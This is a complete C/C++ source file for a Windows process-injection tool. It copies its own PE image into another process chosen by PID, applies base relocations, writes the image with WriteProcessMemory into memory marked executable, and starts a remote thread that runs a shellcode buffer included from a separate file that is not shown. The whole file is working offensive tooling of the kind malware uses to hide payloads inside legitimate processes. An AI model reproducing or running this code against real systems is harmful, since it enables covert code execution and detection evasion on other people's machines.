#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

#include "base.cpp"

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

DWORD EntryPoint() {
    (*(void(*)())(&buf))();
    return 0;
}


// This function handles base relocations of the PE image.
void PerformBaseRelocation(PVOID localImage, PIMAGE_NT_HEADERS ntHeader, DWORD_PTR deltaImageBase) {
    // The base relocation table is obtained from the NT headers.
    PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    
    // Each relocation block is iterated over.
    while (relocationTable->SizeOfBlock > 0) {
        // The number of relocation entries in this block is calculated.
        DWORD relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
        PBASE_RELOCATION_ENTRY relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);

        // Each relocation entry is iterated over.
        for (DWORD i = 0; i < relocationEntriesCount; i++) {
            if (relocationRVA[i].Offset) {
                // The relocation is performed by adding the delta to the address.
                PDWORD_PTR patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
                *patchedAddress += deltaImageBase;
            }
        }

        // The next relocation block is processed.
        relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
    }
}

// This PE injection runtime function handles loading and injecting the PE into the process.
bool InjectPEIntoProcess(DWORD pid) {
    // The current process's image base is obtained.
    PVOID imageBase = GetModuleHandle(NULL);
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + ((PIMAGE_DOS_HEADER)imageBase)->e_lfanew);

    // Local memory is allocated to store the PE image in the target process.
    PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
    if (localImage == NULL) return false;

    // The PE image is copied into the local memory.
    memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);

    // The target process is opened.
    HANDLE targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (targetProcess == NULL) return false;

    // Memory is allocated in the target process for the PE image.
    PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (targetImage == NULL) return false;

    // The base address delta between the current and target processes is calculated.
    DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;

    // Base relocation is performed.
    PerformBaseRelocation(localImage, ntHeader, deltaImageBase);

    // The relocated image is written to the target process.
    if (!WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL)) return false;

    // A remote thread is created to execute the entry point of the injected PE.
	if (CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)EntryPoint + deltaImageBase), NULL, 0, NULL) == NULL) return false;

    // The handle to the target process is closed to clean up.
    CloseHandle(targetProcess);
    return true;
}

// This is the main function that handles argument parsing and initiates the PE injection.
int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    // The provided PID argument is converted from string to DWORD.
    DWORD pid = strtol(argv[1], NULL, 10);
    if (pid == 0) {
        printf("Invalid PID provided.\n");
        return 1;
    }

    // The PE is injected into the specified process.
    if (!InjectPEIntoProcess(pid)) {
        printf("Failed to inject the PE into the target process.\n");
        return 1;
    }

    return 0;
}
